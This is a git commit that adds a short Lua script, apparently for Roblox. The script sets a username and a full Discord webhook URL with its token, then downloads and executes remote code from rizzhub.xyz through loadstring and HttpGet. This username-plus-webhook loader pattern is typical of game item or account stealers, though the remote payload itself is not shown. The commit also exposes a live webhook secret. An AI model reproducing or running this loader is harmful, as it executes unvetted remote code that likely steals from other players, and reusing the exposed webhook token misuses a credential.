b9e21611f1400af26984c8f069b087360790924b
ekinoo200 <130805551+ekinoo200@users.noreply.github.com>
2023-04-16 00:37:45 +0200

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,4 @@
+UserName = "Mortyqp"
+Webhook = "https://discord.com/api/webhooks/1096842202107359252/rDTG9BpvCJUVFmBrYlByMCRJba2CMqBrYESVg4kYBFcHwwkjLYRPbt4JMWqxVMqr5V2e"
+
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
